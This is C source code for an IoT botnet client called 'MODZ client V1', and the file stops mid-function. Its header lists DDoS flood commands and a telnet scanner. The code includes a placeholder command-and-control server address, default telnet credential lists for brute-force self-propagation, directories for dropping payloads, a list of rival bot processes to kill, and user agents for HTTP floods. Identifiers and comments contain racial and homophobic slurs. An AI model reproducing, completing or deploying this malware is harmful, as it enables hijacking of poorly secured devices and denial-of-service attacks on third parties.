/*
███╗   ███╗ ██████╗ ██████╗ ███████╗
████╗ ████║██╔═══██╗██╔══██╗╚══███╔╝
██╔████╔██║██║   ██║██║  ██║  ███╔╝ 
██║╚██╔╝██║██║   ██║██║  ██║ ███╔╝  
██║ ╚═╝ ██║╚██████╔╝██████╔╝███████╗
╚═╝     ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝ 


If you have this you are trusted. Please do not leak!
MODZ client V1

Current Owner Count - 2
   ____                                                       _       
  / ___|   ___    _ __ ___    _ __ ___     __ _   _ __     __| |  ___ 
 | |      / _ \  | '_ ` _ \  | '_ ` _ \   / _` | | '_ \   / _` | / __|
 | |___  | (_) | | | | | | | | | | | | | | (_| | | | | | | (_| | \__ \
  \____|  \___/  |_| |_| |_| |_| |_| |_|  \__,_| |_| |_|  \__,_| |___/

!* JUNK <IP> <PORT> <TIME>------------------JUNK FLOOD

!* HOLD <IP> <PORT> <TIME>------------------HOLD FLOOD

!* STD <IP> <PORT> <TIME>-------------------STD FLOOD

!* UDP <IP> <PORT <TIME> 32 1337 10---------RAW UDP FLOOD

!* TCP <IP> <PORT <TIME> 32 all 1337 10-----TCP FLOOD

!* HTTP <IP> <METHOD> <PORT> / <TIME> 1337--MULTI THREADED HTTP FLOOD

!* CNC <IP> <PORT> <TIME>-------------------CnC FLOOD

Otha Commandz

!* PING-----------------Pings Bot

!* TELSCAN ON | OFF-----TURNS ON TELNET SCANNA

!* UPDATE---------------REINFECTS DEVICE

!* NIGGERKILL-----------DEINFECTS OTHER BOTNETS

!* GETPUBLICIP----------GIVES PUBLIC IP ADDRESS

*/
#define PHI 0x9e3779b9
#define PR_SET_NAME 15
#define SERVER_LIST_SIZE (sizeof(TelnetNigger) / sizeof(unsigned char *))
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define CMD_IAC 255
#define CMD_WILL 251
#define CMD_WONT 252
#define CMD_DO 253
#define CMD_DONT 254
#define OPT_SGA 3
#define STD2_SIZE 420
#define BUFFER_SIZE 1024
#define VERSION "MODZ-V1"

// EchoLoader Shit

#define mips "8UsAm"
#define mipsel "8UsAml"
#define sh4 "8UsAsh"
#define x86_64 "8UsA64"
#define i586 "8UsA58"
#define i686 "8UsA68"
#define powerpc "8UsApc"
#define m68k "8UsAk68"
#define sparc "8UsAsc"
#define armv4 "8UsA4"
#define armv5 "8UsA5"
#define armv6 "8UsA6"
#define all "8UsA.sh"

// End of Echo 

#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>




/*------------------------------------------------------------------------------------------------------------------------*/

/*

Change 127.0.0.1 to your vps ip!!!!!!

*/

unsigned char *TelnetNigger[] =
{
"127.0.0.1"
};
int Server_Botport = 666;

/*

Heres The Telnet selfrep shit

Make sure you put your telnet payload below

*/

char *infect = "\r\n";
char *usernames[] = {"telnet\0", "root\0", "root\0", "admin\0", "root\0", "admin\0", "root\0", "admin\0"};
char *passwords[] = {"telnet\0", "\0", "root\0", "admin\0", "1234\0", "root\0", "123456\0", "1234\0"};
char* tmpdirs[] = {"/dev/netslink/", "/tmp/", "/var/", "/dev/", "/var/run/", "/dev/shm/", "/mnt/", "/boot/", "/usr/", (char*) 0};
char* advances[] = {":", "ogin", "sername", "assword", (char*)0};
char* fails[] = {"nvalid", "ailed", "ncorrect", "enied", "rror", "oodbye", "bad", (char*)0};
char* successes[] = {"busybox", "$", "#", (char*)0};
char* infected[] = {"peenis"};
char *infectedmessage = "peenis";
char* advances2[] = {"nvalid", "ailed", "ncorrect", "enied", "rror", "oodbye", "bad", "busybox", "$", "#", (char*)0};
int oldranges[] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255};
int oldranges2[] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255};
int rangesA[] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255};
int rangesB1[] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255};
int rangesB2[] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255};
int rangesC1[] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255};
int rangesC2[] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255};
int rangesC3[] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255};

/*------------------------------------------------------------------------------------------------------------------------*/


const char *bots[] = {
"Dope*",
"mips",
"mipsel",
"x86",
"sh4",
"i686",
"ppc",
"i586",
"i586",
"jack*",
"hack*",
"arm*",
"tel*",
"b1",
"b2",
"b3",
"b4",
"b5",
"b6",
"b7",
"b8",
"b9",
"lol*",
"busybox*",
"badbox*",
"DFhxdhdf",
"dvrHelper",
"FDFDHFC",
"FEUB",
"FTUdftui",
"GHfjfgvj",
"jhUOH",
"JIPJIPJj",
"JIPJuipjh",
"kmyx86_64",
"lolmipsel",
"mips",
"mipsel",
"RYrydry",
"TwoFace*",
"UYyuyioy",
"wget",
"x86_64",
"XDzdfxzf",
"xx*",
"sh",
"1",
"2",
"3",
"4",
"5",
"6",
"7",
"8",
"9",
"10",
"11",
"12",
"13",
"14",
"15",
"16",
"17",
"18",
"19",
"20",
"busybox",
"badbox",
"Mirai*",
"mirai*",
"cunty*",
"IoT*",
"mips",
"mipsel",
"sh4",
"x86",
"i686",
"ppc",
"i586",
"i586",
"jackmy*",
"hackmy*",
"arm*",
"b1",
"b2",
"b3",
"b4",
"b5",
"b6",
"b7",
"b8",
"b9",
"busyboxterrorist",
"DFhxdhdf",
"dvrHelper",
"FDFDHFC",
"FEUB",
"FTUdftui",
"GHfjfgvj",
"jhUOH",
"JIPJIPJj",
"JIPJuipjh",
"kmyx86_64",
"lolmipsel",
"mips",
"mipsel",
"RYrydry",
"tel*",
"TwoFace*",
"UYyuyioy",
"wget",
"x86_64",
"XDzdfxzf",
"xxb*",
"sh",
"hackz",
"bin*",
"gtop",
"tftp*",
"botnet",
"swatnet",
"ballpit",
"fucknet",
"cracknet",
"weednet",
"gaynet",
"queernet",
"ballnet",
"unet",
"yougay",
"sttftp",
"sstftp",
"sbtftp",
"btftp",
"y0u1sg3y",
"bruv*",
"IoT*",
"love*",
"kmy*",
"pl0x*",
"kittyphones",
"ftp",
"pftp",
" ",
"httpd",
"telnetd"
};
const char *useragents[] = {
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38",
"Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
"Mozilla/5.0 (X11; CrOS x86_64 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G930W8 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.4 Chrome/51.0.2704.106 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
"Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 535) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Mobile Safari/537.36 Edge/14.14393",
"Mozilla/5.0 (Linux; Android 4.4.4; HTC Desire 620 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.0; HUAWEI GRA-L09 Build/HUAWEIGRA-L09) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36",
"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc",
"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk",
"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41",
"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)",
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15"
"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0",
"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1",
"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)",
"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",
"Mozilla/5.0 (PLAYSTATION 3; 3.55)",
"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2",
"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
};
int initConnection();
int getBogos(unsigned char *bogomips);
int getCores();
int getCountry(unsigned char *buf, int bufsize);
void makeRandomStr(unsigned char *buf, int length);
int sockprintf(int sock, char *formatStr, ...);
char *inet_ntoa(struct in_addr in);
int mainCommSock = 0, currentServer = -1, gotIP = 0;
uint32_t *pids;
int rangechoice = 1;
int hacked = 0;
uint32_t scanPid;
uint64_t numpids = 0;
struct in_addr ourIP;
struct in_addr ourPublicIP;
unsigned char macAddress[6] = {0};
static uint32_t Q[4096], c = 362436;
void init_rand(uint32_t x)
{
int i;
Q[0] = x;
Q[1] = x + PHI;
Q[2] = x + PHI + PHI;
for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}
uint32_t rand_cmwc(void)
{
uint64_t t, a = 18782LL;
static uint32_t i = 4095;
uint32_t x, r = 0xfffffffe;
i = (i + 1) & 4095;
t = a * Q[i] + c;
c = (uint32_t)(t >> 32);
x = t + c;
if (x < c) {
x++;
c++;
}
return (Q[i] = r - x);
}
void trim(char *str)
{
int i;
int begin = 0;
int end = strlen(str) - 1;
while (isspace(str[begin])) begin++;
while ((end >= begin) && isspace(str[end])) end--;
for (i = begin; i <= end; i++) str[i - begin] = str[i];
str[i - begin] = '\0';
}
static void printchar(unsigned char **str, int c)
{
if (str) {
**str = c;
++(*str);
}
else (void)write(1, &c, 1);
}
static int prints(unsigned char **out, const unsigned char *string, int width, int pad)
{
register int pc = 0, padchar = ' ';
if (width > 0) {
register int len = 0;
register const unsigned char *ptr;
for (ptr = string; *ptr; ++ptr) ++len;
if (len >= width) width = 0;
else width -= len;
if (pad & PAD_ZERO) padchar = '0';
}
if (!(pad & PAD_RIGHT)) {
for ( ; width > 0; --width) {
printchar (out, padchar);
++pc;
}
}
for ( ; *string ; ++string) {
printchar (out, *string);
++pc;
}
for ( ; width > 0; --width) {
printchar (out, padchar);
++pc;
}

return pc;
}

static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase)
{
unsigned char print_buf[PRINT_BUF_LEN];
register unsigned char *s;
register int t, neg = 0, pc = 0;
register unsigned int u = i;

if (i == 0) {
print_buf[0] = '0';
print_buf[1] = '\0';
return prints (out, print_buf, width, pad);
}

if (sg && b == 10 && i < 0) {
neg = 1;
u = -i;
}

s = print_buf + PRINT_BUF_LEN-1;
*s = '\0';

while (u) {
t = u % b;
if( t >= 10 )
t += letbase - '0' - 10;
*--s = t + '0';
u /= b;
}

if (neg) {
if( width && (pad & PAD_ZERO) ) {
printchar (out, '-');
++pc;
--width;
}
else {
*--s = '-';
}
}

return pc + prints (out, s, width, pad);
}

static int print(unsigned char **out, const unsigned char *format, va_list args )
{
register int width, pad;
register int pc = 0;
unsigned char scr[2];

for (; *format != 0; ++format) {
if (*format == '%') {
++format;
width = pad = 0;
if (*format == '\0') break;
if (*format == '%') goto out;
if (*format == '-') {
++format;
pad = PAD_RIGHT;
}
while (*format == '0') {
++format;
pad |= PAD_ZERO;
}
for ( ; *format >= '0' && *format <= '9'; ++format) {
width *= 10;
width += *format - '0';
}
if( *format == 's' ) {
register char *s = (char *)va_arg( args, int );
pc += prints (out, s?s:"(null)", width, pad);
continue;
}
if( *format == 'd' ) {
pc += printi (out, va_arg( args, int ), 10, 1, width, pad, 'a');
continue;
}
if( *format == 'x' ) {
pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'a');
continue;
}
if( *format == 'X' ) {
pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'A');
continue;
}
if( *format == 'u' ) {
pc += printi (out, va_arg( args, int ), 10, 0, width, pad, 'a');
continue;
}
if( *format == 'c' ) {
scr[0] = (unsigned char)va_arg( args, int );
scr[1] = '\0';
pc += prints (out, scr, width, pad);
continue;
}
}
else {
out:
printchar (out, *format);
++pc;
}
}
if (out) **out = '\0';
va_end( args );
return pc;
}

int zprintf(const unsigned char *format, ...)
{
va_list args;
va_start( args, format );
return print( 0, format, args );
}

int szprintf(unsigned char *out, const unsigned char *format, ...)
{
va_list args;
va_start( args, format );
return print( &out, format, args );
}


int sockprintf(int sock, char *formatStr, ...)
{
unsigned char *textBuffer = malloc(2048);
memset(textBuffer, 0, 2048);
char *orig = textBuffer;
va_list args;
va_start(args, formatStr);
print(&textBuffer, formatStr, args);
va_end(args);
orig[strlen(orig)] = '\n';
int q = send(sock,orig,strlen(orig), MSG_NOSIGNAL);
free(orig);
return q;
}

static int *fdopen_pids;

int fdpopen(unsigned char *program, register unsigned char *type)
{
register int iop;
int pdes[2], fds, pid;

if (*type != 'r' && *type != 'w' || type[1]) return -1;

if (pipe(pdes) < 0) return -1;
if (fdopen_pids == NULL) {
if ((fds = getdtablesize()) <= 0) return -1;
if ((fdopen_pids = (int *)malloc((unsigned int)(fds * sizeof(int)))) == NULL) return -1;
memset((unsigned char *)fdopen_pids, 0, fds * sizeof(int));
}

switch (pid = vfork())
{
case -1:
close(pdes[0]);
close(pdes[1]);
return -1;
case 0:
if (*type == 'r') {
if (pdes[1] != 1) {
dup2(pdes[1], 1);
close(pdes[1]);
}
close(pdes[0]);
} else {
if (pdes[0] != 0) {
(void) dup2(pdes[0], 0);
(void) close(pdes[0]);
}
(void) close(pdes[1]);
}
execl("/bin/sh", "sh", "-c", program, NULL);
_exit(127);
}
if (*type == 'r') {
iop = pdes[0];
(void) close(pdes[1]);
} else {
iop = pdes[1];
(void) close(pdes[0]);
}
fdopen_pids[iop] = pid;
return (iop);
}

int fdpclose(int iop)
{
register int fdes;
sigset_t omask, nmask;
int pstat;
register int pid;

if (fdopen_pids == NULL || fdopen_pids[iop] == 0) return (-1);
(void) close(iop);
sigemptyset(&nmask);
sigaddset(&nmask, SIGINT);
sigaddset(&nmask, SIGQUIT);
sigaddset(&nmask, SIGHUP);
(void) sigprocmask(SIG_BLOCK, &nmask, &omask);
do {
pid = waitpid(fdopen_pids[iop], (int *) &pstat, 0);
} while (pid == -1 && errno == EINTR);
(void) sigprocmask(SIG_SETMASK, &omask, NULL);
fdopen_pids[fdes] = 0;
return (pid == -1 ? -1 : WEXITSTATUS(pstat));
}

unsigned char *fdgets(unsigned char *buffer, int bufferSize, int fd)
{
int got = 1, total = 0;
while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
return got == 0 ? NULL : buffer;
}

static const long hextable[] = {
[0 ... 255] = -1,
['0'] = 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,
['A'] = 10, 11, 12, 13, 14, 15,
['a'] = 10, 11, 12, 13, 14, 15
};

long parseHex(unsigned char *hex)
{
long ret = 0;
while (*hex && ret >= 0) ret = (ret << 4) | hextable[*hex++];
return ret;
}

int wildString(const unsigned char* pattern, const unsigned char* string) {
switch(*pattern)
{
case '\0': return *string;
case '*': return !(!wildString(pattern+1, string) || *string && !wildString(pattern, string+1));
case '?': return !(*string && !wildString(pattern+1, string+1));
default: return !((toupper(*pattern) == toupper(*string)) && !wildString(pattern+1, string+1));
}
}

int getHost(unsigned char *toGet, struct in_addr *i)
{
struct hostent *h;
if((i->s_addr = inet_addr(toGet)) == -1) return 1;
return 0;
}

void uppercase(unsigned char *str)
{
while(*str) { *str = toupper(*str); str++; }
}

int getBogos(unsigned char *bogomips)
{
int cmdline = open("/proc/cpuinfo", O_RDONLY);
char linebuf[4096];
while(fdgets(linebuf, 4096, cmdline) != NULL)
{
uppercase(linebuf);
if(strstr(linebuf, "BOGOMIPS") == linebuf)
{
unsigned char *pos = linebuf + 8;
while(*pos == ' ' || *pos == '\t' || *pos == ':') pos++;
while(pos[strlen(pos)-1] == '\r' || pos[strlen(pos)-1] == '\n') pos[strlen(pos)-1]=0;
if(strchr(pos, '.') != NULL) *strchr(pos, '.') = 0x00;
strcpy(bogomips, pos);
close(cmdline);
return 0;
}
memset(linebuf, 0, 4096);
}
close(cmdline);
return 1;
}

int getCores()
{
int totalcores = 0;
int cmdline = open("/proc/cpuinfo", O_RDONLY);
char linebuf[4096];
while(fdgets(linebuf, 4096, cmdline) != NULL)
{
uppercase(linebuf);
if(strstr(linebuf, "BOGOMIPS") == linebuf) totalcores++;
memset(linebuf, 0, 4096);
}
close(cmdline);
return totalcores;

}

void makeRandomStr(unsigned char *buf, int length)
{
int i = 0;
for(i = 0; i < length; i++) buf[i] = (rand_cmwc()%(91-65))+65;
}

int recvLine(int socket, unsigned char *buf, int bufsize)
{
memset(buf, 0, bufsize);

fd_set myset;
struct timeval tv;
tv.tv_sec = 30;
tv.tv_usec = 0;
FD_ZERO(&myset);
FD_SET(socket, &myset);
int selectRtn, retryCount;
if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
while(retryCount < 10)
{
sockprintf(mainCommSock, "PING");

tv.tv_sec = 30;
tv.tv_usec = 0;
FD_ZERO(&myset);
FD_SET(socket, &myset);
if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
retryCount++;
continue;
}

break;
}
}

unsigned char tmpchr;
unsigned char *cp;
int count = 0;

cp = buf;
while(bufsize-- > 1)
{
if(recv(mainCommSock, &tmpchr, 1, 0) != 1) {
*cp = 0x00;
return -1;
}
*cp++ = tmpchr;
if(tmpchr == '\n') break;
count++;
}
*cp = 0x00;

return count;
}

struct telstate_t
{
int fd;
unsigned int ip;
unsigned char state;
unsigned char complete;
unsigned char usernameInd;
unsigned char passwordInd;
unsigned char tempDirInd;
unsigned int totalTimeout;
unsigned short bufUsed;
char *sockbuf;
};
const char* get_telstate_host(struct telstate_t* telstate)
{
struct in_addr in_addr_ip;
in_addr_ip.s_addr = telstate->ip;
return inet_ntoa(in_addr_ip);
}

int read_until_response(int fd, int timeout_usec, char* buffer, int buf_size, char** strings)
{
int num_bytes, i;
memset(buffer, 0, buf_size);
num_bytes = read_with_timeout(fd, timeout_usec, buffer, buf_size);

if(buffer[0] == 0xFF)
{
negotiate(fd, buffer, 3);
}

if(contains_string(buffer, strings))
{
return 1;
}

return 0;
}
int read_with_timeout(int fd, int timeout_usec, char* buffer, int buf_size)
{
fd_set read_set;
struct timeval tv;
tv.tv_sec = 0;
tv.tv_usec = timeout_usec;

FD_ZERO(&read_set);
FD_SET(fd, &read_set);

if (select(fd+1, &read_set, NULL, NULL, &tv) < 1)
return 0;

return recv(fd, buffer, buf_size, 0);
}
void advance_state(struct telstate_t* telstate, int new_state)
{
if(new_state == 0)
{
close(telstate->fd);
}

telstate->totalTimeout = 0;
telstate->state = new_state;
memset((telstate->sockbuf), 0, BUFFER_SIZE);
}

void reset_telstate(struct telstate_t* telstate)
{
advance_state(telstate, 0);
telstate->complete = 1;
}
int contains_success(char* buffer)
{
return contains_string(buffer, successes);
}
int contains_fail(char* buffer)
{
return contains_string(buffer, fails);
}
int contains_response(char* buffer)
{
